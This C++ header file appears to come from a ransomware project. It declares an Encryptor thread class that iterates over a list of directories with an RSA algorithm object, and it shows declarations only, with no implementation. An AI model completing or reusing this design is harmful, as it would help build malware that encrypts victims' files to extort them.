//
// Created on 28.01.20.
//

#ifndef RANSOMWARE_ENCRYPTOR_H
#define RANSOMWARE_ENCRYPTOR_H

#include "directory_iterator.h"
#include "rsa_algo.h"
#include "thread.h"

/**
 *
 */
class Encryptor : public Thread {

private:
    std::vector<boost::filesystem::path> _dirs;
    DirectoryIiterator* _directoryIt;
    RSAAlgorithm* _rsaalgo;

public:
    Encryptor(std::vector<boost::filesystem::path>& dirs);
    ~Encryptor();

    virtual void execute();

};


#endif //RANSOMWARE_ENCRYPTOR_H
